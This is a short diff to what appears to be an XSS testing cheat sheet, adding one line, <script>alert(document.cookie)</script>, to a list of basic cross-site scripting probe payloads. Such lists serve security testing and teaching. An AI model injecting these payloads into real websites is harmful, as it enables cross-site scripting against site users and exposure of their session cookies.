@@ -432,6 +432,7 @@ CTRL + U
 ```
 <script>alert("XSS")</script>
 <script>alert(window.origin)</script>
+<script>alert(document.cookie)</script>
 <plaintext>
 <script>print()</script> 
 ```
